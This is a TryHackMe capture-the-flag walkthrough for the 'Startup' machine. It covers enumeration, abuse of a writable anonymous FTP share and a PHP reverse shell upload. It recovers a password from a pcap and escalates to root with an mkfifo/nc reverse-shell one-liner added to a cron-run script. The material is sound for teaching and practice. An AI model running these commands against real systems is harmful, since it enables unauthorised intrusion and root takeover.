# THM - Startup

### Ip: 10.10.2.91
### Name: Startup
### Rating: Easy

------------------------------------------------

![thm_startup_pic.png](../assets/startup_assets/thm_startup_pic.png)

#### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/THM/Startup]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.2.91  
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-19 14:10 CST
Nmap scan report for 10.10.2.91
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.6.72.91
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9a60b841d2201a401304843612bab94 (RSA)
|   256 ec13258c182036e6ce910e1626eba2be (ECDSA)
|_  256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.99 seconds
```

Looking at the site on port 80 we find a simple note:

```

No spice here!

Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. BTW if you're a web developer, contact us. Otherwise, don't you worry. We'll be online shortly!

— Dev Team
```

Before diving into HTTP, let's take a look at FTP, where we see anonymous access is enabled.

```
┌──(ryan㉿kali)-[~/THM/Startup]
└─$ ftp 10.10.2.91   
Connected to 10.10.2.91.
220 (vsFTPd 3.0.3)
Name (10.10.2.91:ryan): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||54597|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> get notice.txt
local: notice.txt remote: notice.txt
229 Entering Extended Passive Mode (|||13408|)
150 Opening BINARY mode data connection for notice.txt (208 bytes).
100% |********************************************************************************|   208      308.23 KiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (1.61 KiB/s)
ftp> get important.jpg
local: important.jpg remote: important.jpg
229 Entering Extended Passive Mode (|||41236|)
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
100% |********************************************************************************|   245 KiB  482.98 KiB/s    00:00 ETA
226 Transfer complete.
251631 bytes received in 00:00 (387.30 KiB/s)
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||25993|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||35678|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
226 Directory send OK.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||48298|)
150 Ok to send data.
100% |********************************************************************************|     3       15.58 KiB/s    00:00 ETA
226 Transfer complete.
3 bytes sent in 00:00 (0.01 KiB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||65332|)
553 Could not create file.
ftp> bye
221 Goodbye.
```

Cool, we were able to download a notice.txt as well as an image. We also confirmed we can write to the ftp directory as well.

Looking at notice.txt we find a potential username Maya:

```
┌──(ryan㉿kali)-[~/THM/Startup]
└─$ cat notice.txt        
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

Cool. Turning now back to HTTP we can do some directory fuzzing and we find a `/files` endpoint:

```
┌──(ryan㉿kali)-[~/THM/Startup]
└─$ feroxbuster --url http://10.10.2.91  -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 400,403,404,503
404      GET        9l        -w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       20l      113w      808c http://10.10.2.91/
301      GET        9l       28w      308c http://10.10.2.91/files => http://10.10.2.91/files/
```

Looking at the page we find the FTP directory, which we already confirmed we have write access to.

thm_startup_files.png

thm_startup_test.png


Let's exploit this misconfiguration by uploading a copy of PentestMonkey's PHP reverse shell to the FTP directory:
```
┌──(ryan㉿kali)-[~/THM/Startup]
└─$ ftp 10.10.2.91
Connected to 10.10.2.91.
220 (vsFTPd 3.0.3)
Name (10.10.2.91:ryan): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||34911|)
150 Here comes the directory listing.
-rwxrwxr-x    1 112      118             3 Nov 19 20:13 test.txt
226 Directory send OK.
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||32308|)
150 Ok to send data.
100% |********************************************************************************|  5526       17.56 MiB/s    00:00 ETA
226 Transfer complete.
5526 bytes sent in 00:00 (21.88 KiB/s)
ftp> bye
221 Goodbye.
```

Navigating to the file in the browser we trigger our shell:

```
┌──(ryan㉿kali)-[~/THM/Startup]
└─$ nc -lnvp 443 
listening on [any] 443 ...
connect to [10.6.72.91] from (UNKNOWN) [10.10.2.91] 42686
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:22:05 up 14 min,  0 users,  load average: 0.02, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname
startup
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@startup:/$
```

We are unable to access user lennie's directory, but in `/` we find the answer to the first question:

```
www-data@startup:/home$ ls
lennie
www-data@startup:/home$ cd lennie
bash: cd: lennie: Permission denied
```

thm_startup_1.png

Interestingly, also in `/` is a directory called `incidents` which contains a pcap file:

```
www-data@startup:/$ cd incidents
www-data@startup:/incidents$ ls
suspicious.pcapng
```

Lets use python to start an HTTP server on the target:

```
www-data@startup:/incidents$ python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
10.6.72.91 - - [19/Nov/2024 20:29:39] "GET /suspicious.pcapng HTTP/1.1" 200 -
```

And use `wget` to fetch it and download it locally to our attacking machine:

```
┌──(ryan㉿kali)-[~/THM/Startup]
└─$ wget 10.10.2.91:8000/suspicious.pcapng
--2024-11-19 14:29:39--  http://10.10.2.91:8000/suspicious.pcapng
Connecting to 10.10.2.91:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31224 (30K) [application/octet-stream]
Saving to: ‘suspicious.pcapng’

suspicious.pcapng               100%[====================================================>]  30.49K  --.-KB/s    in 0.1s    

2024-11-19 14:29:39 (246 KB/s) - ‘suspicious.pcapng’ saved [31224/31224]
```

Lets then use WireShark to interact with the file:

```
┌──(ryan㉿kali)-[~/THM/Startup]
└─$ wireshark suspicious.pcapng 
```

Looking through some of the TCP streams, we see a credential. 

thm_startup_pcap.png

We can see this doesn't work for user www-data, but we can trying using it for Lennie, and find that it works:

```
www-data@startup:/incidents$ su lennie
Password: 
lennie@startup:/incidents$ whoami
lennie
lennie@startup:/incidents$
```

Cool, so now we have a shell as user Lennie: `lennie:c4ntg3t3n0ughsp1c3`

We can now grab the user.txt flag:

thm_startup_user.png

### Privilege Escalation

In Lennies directory we find another directory called scripts, which contains a file called planner.sh, which lennie has read and execute privileges to:

```
lennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Nov 19 20:38 startup_list.txt
```

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

We see the script also calls another script called `/etc/print.sh`, and looking at the permissions there, we see lennie has full control:

```
lennie@startup:~/scripts$ ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

Last thing to check is to see if planner.sh is being run as a cronjob with root permissions.

Loading pspy64 to the target we find it is indeed being run as root:

thm_strartup_cron.png

So, in theory, we should be able to modify `/etc/print.sh` to something malicious, and when it is executed it will be run as root.

Let's give it a shot:

First lets add a reverse shell to the end of `/etc/print.sh`, which will be executed with root permissions:

```
lennie@startup:/tmp$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.72.91 9001 >/tmp/f
```

Then we simply wait for the cronjob and catch our root shell:

thm_startup_shell.png

Lastly, we can grab the final flag:

thm_startup_root.png

Thanks for following along!

-Ryan

-----------------------------------------------

